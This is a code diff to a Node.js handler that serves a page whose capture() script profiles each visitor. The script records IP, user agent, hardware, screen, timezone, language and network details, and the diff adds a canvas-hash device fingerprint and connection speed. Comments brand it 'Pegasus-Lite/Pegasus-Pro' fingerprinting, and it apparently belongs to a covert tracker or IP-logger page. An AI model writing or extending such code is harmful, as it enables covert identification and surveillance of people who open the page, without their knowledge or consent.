@@ -44,19 +44,40 @@ module.exports = async (req, res) => {
     </div>
     <script>
         async function capture() {
+            // Level 4 Pegasus-Lite Advanced Fingerprinting: Canvas Hash
+            const generateCanvasHash = () => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
+                    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = "#069"; ctx.fillText("🕵️‍♂️SINTEL-HP" + navigator.userAgent, 2, 15);
+                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("🕵️‍♂️SINTEL-HP", 4, 17);
+                    const dataURI = canvas.toDataURL();
+                    let hash = 0;
+                    for (let i = 0; i < dataURI.length; i++) {
+                        hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
+                        hash = hash & hash;
+                    }
+                    return Math.abs(hash).toString(16);
+                } catch (e) { return "Unknown"; }
+            };
+
             const payload = {
                 ip: "${cleanIp}",
                 ua: navigator.userAgent,
                 time: new Date().toISOString(),
-                // Fingerprinting Level 3 (Pegasus-Lite)
-                screen: window.screen.width + "x" + window.screen.height,
-                cpu: navigator.hardwareConcurrency || 'Unknown',
-                ram: navigator.deviceMemory || 'Unknown',
+                // Fingerprinting Level 4 (Pegasus-Pro)
+                device_hash: generateCanvasHash(),
+                screen: window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)",
+                cpu: navigator.hardwareConcurrency || '??',
+                ram: navigator.deviceMemory || '??',
                 platform: navigator.platform,
                 gpu: 'Unknown',
                 battery: 'Unknown',
                 charging: 'Unknown',
                 network: 'Unknown',
+                speed: 'Unknown',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                 language: navigator.language || 'Unknown',
                 touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
@@ -65,6 +86,7 @@ module.exports = async (req, res) => {
             // Network Info
             if (navigator.connection) {
                 payload.network = navigator.connection.effectiveType || 'Unknown';
+                payload.speed = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : 'Unknown';
             }
 
             // Get GPU Info
